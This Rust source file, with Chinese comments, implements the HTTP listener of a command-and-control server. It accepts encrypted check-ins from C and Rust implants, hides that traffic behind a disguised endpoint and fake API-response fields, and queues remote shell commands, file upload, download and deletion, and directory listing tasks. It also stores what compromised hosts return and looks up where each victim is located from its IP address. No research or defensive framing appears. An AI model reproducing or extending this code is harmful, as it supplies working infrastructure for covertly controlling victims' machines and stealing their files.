//! HTTP Beacon 监听器模块（统一加密端点）

use crate::state::{ConnectedClient, SharedState};
use axum::{
    extract::{ConnectInfo, State},
    http::StatusCode,
    response::IntoResponse,
    routing::{get, post},
    Json, Router,
};
use serde::{Deserialize, Serialize};
use shared::crypto::Crypto;
use shared::messages::{ClientIdentification, Message as C2Message};
use std::net::SocketAddr;


/// 创建 HTTP 服务器路由
pub fn create_router(state: SharedState) -> Router {
    Router::new()
        .route("/api/CpHDCPSvc", post(handle_c2))
        .route("/api/health", get(|| async { "OK" }))
        // 不使用 CORS 中间件，避免暴露 Access-Control-* headers
        .with_state(state)
}

/// 统一请求格式（加密后）
/// 使用 deny_unknown_fields = false（默认）来忽略 C Implant 发送的伪装字段
#[derive(Deserialize)]
struct EncryptedRequest {
    data: String,  // Base64 编码的加密数据
    // 可选字段（伪装用，不解析）
    #[serde(flatten)]
    _extra: std::collections::HashMap<String, serde_json::Value>,
}

/// 统一响应格式（含伪装字段）
#[derive(Serialize)]
struct EncryptedResponse {
    // === 伪装字段 ===
    #[serde(rename = "apiVersion")]
    api_version: String,
    #[serde(rename = "requestId")]
    request_id: String,
    status: String,
    timestamp: u64,
    #[serde(rename = "serverVersion")]
    server_version: String,
    // === 真实数据 ===
    data: String,  // Base64 编码的加密数据
}

impl EncryptedResponse {
    fn new(data: String) -> Self {
        use rand::Rng;
        let mut rng = rand::thread_rng();
        
        Self {
            api_version: "2.1.0".to_string(),
            request_id: format!("res_{:032x}", rng.gen::<u128>()),
            status: "success".to_string(),
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs(),
            server_version: "2.1.0".to_string(),
            data,
        }
    }
}

/// 解密后的请求格式
#[derive(Deserialize)]
struct C2Request {
    #[serde(rename = "type")]
    request_type: String,  // "checkin", "beacon", "result"
    client_id: String,
    payload: serde_json::Value,
}

/// 解密后的响应格式
#[derive(Serialize)]
struct C2Response {
    #[serde(rename = "type")]
    response_type: String,
    payload: serde_json::Value,
}

/// 统一处理所有 C2 请求
pub async fn handle_c2(
    State(state): State<SharedState>,
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
    headers: axum::http::HeaderMap,
    body: axum::body::Bytes,
) -> impl IntoResponse {
    
    // Parse JSON manually
    let encrypted_req: EncryptedRequest = match serde_json::from_slice(&body) {
        Ok(r) => r,
        Err(e) => {
            println!("[!] Failed to parse EncryptedRequest: {}", e);
            return (StatusCode::BAD_REQUEST, Json(serde_json::json!({ "error": "Invalid JSON" })));
        }
    };
    
    // 获取加密密钥
    let encryption_key = state.get_current_encryption_key();
    if encryption_key.is_empty() {
        return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({ "error": "No key" })));
    }
    
    let crypto = match Crypto::from_hex(&encryption_key) {
        Ok(c) => c,
        Err(_) => {
            return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({ "error": "Invalid key" })));
        }
    };
    
    // Base64 解码
    let encrypted_data = match base64::Engine::decode(&base64::engine::general_purpose::STANDARD, &encrypted_req.data) {
        Ok(d) => d,
        Err(e) => {
            println!("[!] Base64 decode failed: {:?}", e);
            println!("[!] Data length: {}", encrypted_req.data.len());
            return (StatusCode::BAD_REQUEST, Json(serde_json::json!({ "error": "Invalid Base64" })));
        }
    };
    
    // 解密
    let decrypted = match crypto.decrypt(&encrypted_data) {
        Ok(d) => d,
        Err(e) => {
            println!("[!] Decryption failed: {:?}", e);
            return (StatusCode::UNAUTHORIZED, Json(serde_json::json!({ "error": "Decryption failed" })));
        }
    };
    
    // 解析请求
    let request: C2Request = match serde_json::from_slice(&decrypted) {
        Ok(r) => r,
        Err(e) => {
            println!("[!] Failed to parse C2 request: {}", e);
            println!("[!] Raw content: {:?}", String::from_utf8_lossy(&decrypted));
            return (StatusCode::BAD_REQUEST, Json(serde_json::json!({ "error": "Invalid request" })));
        }
    };
    
    // 根据类型分发处理
    let response = match request.request_type.as_str() {
        "checkin" => handle_checkin(&state, &headers, &addr, &request).await,
        "beacon" => handle_beacon(&state, &request).await,
        "result" => handle_result(&state, &request).await,
        _ => {
            println!("[!] Unknown request type: {}", request.request_type);
            C2Response {
                response_type: "error".to_string(),
                payload: serde_json::json!({ "error": "Unknown type" }),
            }
        }
    };
    
    // 序列化响应
    let response_json = serde_json::to_vec(&response).unwrap_or_default();
    
    // 加密响应
    let encrypted_response = match crypto.encrypt(&response_json) {
        Ok(e) => e,
        Err(_) => {
            return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({ "error": "Encryption failed" })));
        }
    };
    
    // Base64 编码
    let response_b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &encrypted_response);
    
    // 使用伪装响应格式
    let response_json = serde_json::to_value(EncryptedResponse::new(response_b64)).unwrap_or_default();
    (StatusCode::OK, Json(response_json))
}

/// 处理 Checkin 请求
async fn handle_checkin(
    state: &SharedState,
    headers: &axum::http::HeaderMap,
    addr: &SocketAddr,
    request: &C2Request,
) -> C2Response {
    // 解析上线信息
    let info: ClientIdentification = match serde_json::from_value(request.payload.clone()) {
        Ok(i) => i,
        Err(e) => {
            println!("[!] Failed to parse checkin payload: {}", e);
            return C2Response {
                response_type: "checkin".to_string(),
                payload: serde_json::json!({ "success": false, "error": "Invalid payload" }),
            };
        }
    };
    
    let ip = get_client_ip(headers, addr);
    println!("[+] New client checkin: {} from {}", request.client_id, ip);
    
    let client = ConnectedClient::from_identification(info, ip.clone());
    let client_id = client.id.clone();
    state.add_client(client);
    
    // 异步查询 IP 地理位置，不阻塞 checkin 响应
    let state_clone = state.clone();
    tokio::spawn(async move {
        if let Some(country) = get_country_from_ip(&ip).await {
            if let Some(c) = state_clone.clients.write().get_mut(&client_id) {
                c.country = country;
            }
        }
    });
    
    C2Response {
        response_type: "checkin".to_string(),
        payload: serde_json::json!({ "success": true }),
    }
}

/// 处理 Beacon 请求
async fn handle_beacon(state: &SharedState, request: &C2Request) -> C2Response {
    let client_id = &request.client_id;
    
    // 更新客户端最后在线时间
    state.update_last_seen(client_id);
    
    // 获取待执行的命令
    let pending = state.take_pending_commands(client_id);
    
    // 将 bincode 序列化的命令转换为 C Implant 可理解的 JSON 任务格式
    // C Implant 期望: {"tasks":[{"id":"...", "command":1, "args":"..."}]}
    // 命令类型: 1=shell, 2=download, 3=upload, 4=process, 5=sysinfo, 6=exit
    let mut tasks: Vec<serde_json::Value> = Vec::new();
    
    for data in &pending {
        if let Ok(msg) = C2Message::deserialize(data) {
            let task_id = format!("task_{:016x}", rand::random::<u64>());
            let (command, args) = match msg {
                C2Message::ShellExecute(shell) => (1, shell.command),
                C2Message::FileDownload(fd) => {
                    // 记录下载任务的文件路径，以便响应时恢复文件名
                    state.add_pending_download(client_id, fd.path.clone());
                    (3, fd.path)  // CMD_DOWNLOAD = 3
                },
                C2Message::FileUpload(fu) => {
                    let args = format!("{}|{}", fu.path, base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &fu.data));
                    (2, args)  // CMD_UPLOAD = 2
                },


                C2Message::Exit => (6, String::new()),
                C2Message::SetBeaconInterval(sbi) => {
                    println!("[*] Set beacon interval to {} seconds for client: {}", sbi.interval_seconds, client_id);
                    (8, sbi.interval_seconds.to_string())  // Command 8 = set beacon interval, args = interval in seconds
                },
                C2Message::GetDirectoryListing(gdl) => (7, gdl.path),
                C2Message::FileDelete(fd) => (9, fd.path),  // CMD_DELETE = 9
                _ => continue, // Skip unsupported message types

            };
            
            tasks.push(serde_json::json!({
                "id": task_id,
                "command": command,
                "args": args
            }));
        }
    }
    
    if !tasks.is_empty() {
        println!("[*] Beacon from {}: sending {} commands", client_id, tasks.len());
    }
    
    // For backward compatibility with Rust implant, also include base64-encoded commands
    let commands: Vec<String> = pending.iter()
        .map(|data| base64::Engine::encode(&base64::engine::general_purpose::STANDARD, data))
        .collect();
    
    C2Response {
        response_type: "beacon".to_string(),
        payload: serde_json::json!({ 
            "commands": commands,  // For Rust implant
            "tasks": tasks         // For C implant
        }),
    }
}

/// 处理 Result 请求
async fn handle_result(state: &SharedState, request: &C2Request) -> C2Response {
    let client_id = &request.client_id;
    state.update_last_seen(client_id);
    
    // Try to parse as C Implant format first: {"task_id": "...", "success": true, "output": "base64..."}
    if let (Some(task_id), Some(success), Some(output_b64)) = (
        request.payload.get("task_id").and_then(|v| v.as_str()),
        request.payload.get("success").and_then(|v| v.as_bool()),
        request.payload.get("output").and_then(|v| v.as_str()),
    ) {
        // Decode base64 output
        let output = if let Ok(decoded) = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, output_b64) {
            String::from_utf8_lossy(&decoded).to_string()
        } else {
            output_b64.to_string()
        };
        
        // 临时调试日志
        let preview: String = output.chars().take(200).collect();
        println!("[DEBUG] C implant result: task_id={}, success={}, output_len={}, preview={}", task_id, success, output.len(), preview);
        
        // 尝试识别并处理目录列表响应
        // C implant 返回的目录列表格式: [{"name":"...", "is_dir": true/false, "size": ...}, ...]
        if try_handle_directory_listing(state, client_id, &output) {
            return C2Response {
                response_type: "result".to_string(),
                payload: serde_json::json!({ "success": true }),
            };
        }
        
        // 尝试识别文件上传/下载响应
        if try_handle_file_operation(state, client_id, &output, success) {
            return C2Response {
                response_type: "result".to_string(),
                payload: serde_json::json!({ "success": true }),
            };
        }
        
        // Log and store the result (默认作为 Shell 响应)
        let preview: String = output.chars().take(100).collect();
        let suffix = if output.chars().count() > 100 { "..." } else { "" };
        println!("[*] Shell response from {} (task {}): {}{}", client_id, task_id, preview, suffix);
        
        // Store shell response for GUI
        let shell_response = crate::state::ShellResponse {
            client_id: client_id.to_string(),
            output: output.clone(),
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs() as i64,
            is_error: !success,
        };
        state.add_shell_response(shell_response);
        
        return C2Response {
            response_type: "result".to_string(),
            payload: serde_json::json!({ "success": true }),
        };

    }
    
    // Fallback to Rust Implant format: payload is Vec<String> of base64-encoded bincode messages
    let responses: Vec<String> = match serde_json::from_value(request.payload.clone()) {
        Ok(r) => r,
        Err(_) => {
            return C2Response {
                response_type: "result".to_string(),
                payload: serde_json::json!({ "success": false }),
            };
        }
    };
    
    for response_b64 in &responses {
        // Base64 解码
        if let Ok(data) = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, response_b64) {
            // 反序列化消息
            if let Ok(msg) = C2Message::deserialize(&data) {
                handle_client_message(state, client_id, msg).await;
            }
        }
    }
    
    C2Response {
        response_type: "result".to_string(),
        payload: serde_json::json!({ "success": true }),
    }
}

/// 处理客户端消息
async fn handle_client_message(state: &SharedState, client_id: &str, msg: C2Message) {
    match msg {
        C2Message::Heartbeat(hb) => {
            println!("[*] Heartbeat from {}: {}", client_id, hb.timestamp);
        }
        C2Message::ShellExecuteResponse(response) => {
            let preview: String = response.output.chars().take(100).collect();
            let suffix = if response.output.chars().count() > 100 { "..." } else { "" };
            println!("[*] Shell response from {}: {}{}", client_id, preview, suffix);
            
            let shell_response = crate::state::ShellResponse {
                client_id: client_id.to_string(),
                output: response.output,
                is_error: response.is_error,
                timestamp: chrono::Utc::now().timestamp(),
            };
            state.add_shell_response(shell_response);
        }
        C2Message::DirectoryListingResponse(response) => {
            println!("[*] Directory listing from {}: {} entries", client_id, response.entries.len());
            let file_response = crate::state::FileResponse::DirectoryListing {
                path: response.path,
                entries: response.entries.into_iter().map(|e| crate::state::FileEntryInfo {
                    name: e.name,
                    path: e.path,
                    is_dir: e.is_dir,
                    size: e.size,
                    modified: e.modified,
                }).collect(),
                error: response.error,
            };
            state.add_file_response(client_id, file_response);
        }
        C2Message::FileDownloadResponse(response) => {
            println!("[*] File download from {}: {} bytes", client_id, response.data.len());
            let file_response = crate::state::FileResponse::FileDownload {
                path: response.path,
                data: response.data,
                error: response.error,
            };
            state.add_file_response(client_id, file_response);
        }
        C2Message::FileUploadResponse(response) => {
            println!("[*] File upload response from {}: {}", client_id, response.success);
            let file_response = crate::state::FileResponse::FileUpload {
                path: response.path,
                success: response.success,
                error: response.error,
            };
            state.add_file_response(client_id, file_response);
        }
        C2Message::FileDeleteResponse(response) => {
            println!("[*] File delete response from {}: {}", client_id, response.success);
            let file_response = crate::state::FileResponse::FileDelete {
                path: response.path,
                success: response.success,
                error: response.error,
            };
            state.add_file_response(client_id, file_response);
        }
        _ => {
            println!("[?] Unknown message from {}", client_id);
        }
    }
}

/// 尝试将输出解析为目录列表并存储
/// 返回 true 表示成功识别为目录列表
fn try_handle_directory_listing(state: &SharedState, client_id: &str, output: &str) -> bool {
    // 快速检查：必须是 JSON 数组
    let trimmed = output.trim();
    if !trimmed.starts_with('[') || !trimmed.ends_with(']') {
        return false;
    }
    
    // 尝试解析为 C implant 的目录条目格式
    #[derive(serde::Deserialize)]
    struct CImplantFileEntry {
        name: String,
        #[serde(default)]
        path: Option<String>,  // 新版本 C implant 返回完整路径
        is_dir: bool,
        size: i64,
    }
    
    let entries: Vec<CImplantFileEntry> = match serde_json::from_str(trimmed) {
        Ok(e) => e,
        Err(e) => {
            println!("[!] Failed to parse directory listing from C implant: {}", e);
            return false;
        }
    };
    
    // 转换为服务端格式
    let file_entries: Vec<crate::state::FileEntryInfo> = entries.into_iter().map(|e| {
        crate::state::FileEntryInfo {
            name: e.name.clone(),
            path: e.path.unwrap_or_else(|| e.name.clone()),  // 优先使用 path，否则用 name
            is_dir: e.is_dir,
            size: e.size as u64,
            modified: 0,  // C implant 目前不返回修改时间
        }
    }).collect();

    
    println!("[*] Directory listing from {} (C implant): {} entries", client_id, file_entries.len());
    
    let file_response = crate::state::FileResponse::DirectoryListing {
        path: String::new(),  // 路径需要从上下文获取，暂时为空
        entries: file_entries,
        error: None,
    };
    state.add_file_response(client_id, file_response);
    
    true
}

/// 尝试识别文件上传/下载响应
/// 返回 true 表示成功识别为文件操作响应
fn try_handle_file_operation(state: &SharedState, client_id: &str, output: &str, success: bool) -> bool {
    // 识别文件上传成功响应
    if output == "File uploaded successfully" {
        println!("[*] File upload success from {} (C implant)", client_id);
        let file_response = crate::state::FileResponse::FileUpload {
            path: String::new(),
            success: true,
            error: None,
        };
        state.add_file_response(client_id, file_response);
        return true;
    }
    
    // 识别文件上传失败响应
    if output == "File upload failed" || output == "Invalid upload format" {
        println!("[*] File upload failed from {} (C implant): {}", client_id, output);
        let file_response = crate::state::FileResponse::FileUpload {
            path: String::new(),
            success: false,
            error: Some(output.to_string()),
        };
        state.add_file_response(client_id, file_response);
        return true;
    }
    
    // 识别文件下载响应（base64 编码的文件内容）
    // 只有在存在待处理下载任务时才尝试识别，避免将普通 shell 输出误判为文件下载
    if success && !output.is_empty() && !output.starts_with('[') && !output.starts_with('{') {
        // 先检查是否有 pending download，有才尝试 base64 解码
        let has_pending = state.pending_downloads.read()
            .get(client_id)
            .map(|v| !v.is_empty())
            .unwrap_or(false);
        
        if has_pending {
            if let Ok(decoded) = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, output) {
                let download_path = state.take_pending_download(client_id).unwrap_or_default();
                println!("[*] File download from {} (C implant): {} bytes, path: {}", client_id, decoded.len(), download_path);
                let file_response = crate::state::FileResponse::FileDownload {
                    path: download_path,
                    data: decoded,
                    error: None,
                };
                state.add_file_response(client_id, file_response);
                return true;
            }
        }
    }
    
    // 识别文件下载失败响应
    if output == "File not found or read failed" {
        let download_path = state.take_pending_download(client_id).unwrap_or_default();
        println!("[*] File download failed from {} (C implant): {}", client_id, download_path);
        let file_response = crate::state::FileResponse::FileDownload {
            path: download_path,
            data: vec![],
            error: Some(output.to_string()),
        };
        state.add_file_response(client_id, file_response);
        return true;

    }
    
    // 识别文件删除成功响应
    if output == "File deleted successfully" {
        println!("[*] File deleted by {} (C implant)", client_id);
        let file_response = crate::state::FileResponse::FileDelete {
            path: String::new(),
            success: true,
            error: None,
        };
        state.add_file_response(client_id, file_response);
        return true;
    }
    
    // 识别文件删除失败响应
    if output == "Failed to delete file" || output == "No file path specified" {
        println!("[*] File delete failed from {} (C implant): {}", client_id, output);
        let file_response = crate::state::FileResponse::FileDelete {
            path: String::new(),
            success: false,
            error: Some(output.to_string()),
        };
        state.add_file_response(client_id, file_response);
        return true;
    }
    
    false
}

/// 从请求中获取客户端真实 IP
fn get_client_ip(headers: &axum::http::HeaderMap, addr: &SocketAddr) -> String {
    if let Some(forwarded) = headers.get("x-forwarded-for").and_then(|h| h.to_str().ok()) {
        if let Some(first_ip) = forwarded.split(',').next() {
            let ip = first_ip.trim();
            if !ip.is_empty() && ip != "127.0.0.1" && ip != "::1" {
                return ip.to_string();
            }
        }
    }
    
    if let Some(real_ip) = headers.get("x-real-ip").and_then(|h| h.to_str().ok()) {
        let ip = real_ip.trim();
        if !ip.is_empty() && ip != "127.0.0.1" && ip != "::1" {
            return ip.to_string();
        }
    }
    
    if let Some(cf_ip) = headers.get("cf-connecting-ip").and_then(|h| h.to_str().ok()) {
        let ip = cf_ip.trim();
        if !ip.is_empty() {
            return ip.to_string();
        }
    }
    
    addr.ip().to_string()
}

/// 通过 IP 获取国家信息（带超时保护）
async fn get_country_from_ip(ip: &str) -> Option<String> {
    if ip == "127.0.0.1" || ip == "::1" || ip.starts_with("192.168.") || ip.starts_with("10.") || ip.starts_with("172.") {
        return Some("Local".to_string());
    }
    
    let url = format!("http://ip-api.com/json/{}?fields=country,countryCode", ip);
    
    // 2 秒超时，避免外部 API 不可用时长时间阻塞
    let result = tokio::time::timeout(
        std::time::Duration::from_secs(2),
        reqwest::get(&url)
    ).await;
    
    match result {
        Ok(Ok(resp)) => {
            if let Ok(json) = resp.json::<serde_json::Value>().await {
                if let Some(country) = json.get("country").and_then(|c| c.as_str()) {
                    return Some(country.to_string());
                }
            }
        }
        Ok(Err(e)) => {
            println!("[!] Failed to query IP location: {}", e);
        }
        Err(_) => {
            println!("[!] IP location query timed out for {}", ip);
        }
    }
    
    None
}

/// 向客户端发送命令（加入队列）
pub fn send_to_client(state: &SharedState, client_id: &str, data: &[u8]) {
    state.push_command(client_id, data.to_vec());
}

/// 启动 HTTP 服务器
pub async fn start_server(state: SharedState, bind_addr: &str) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let app = create_router(state);
    let addr: SocketAddr = bind_addr.parse()?;
    
    println!("[*] Starting HTTP C2 server on {}", addr);
    
    let listener = tokio::net::TcpListener::bind(addr).await?;
    axum::serve(listener, app.into_make_service_with_connect_info::<SocketAddr>()).await?;
    
    Ok(())
}
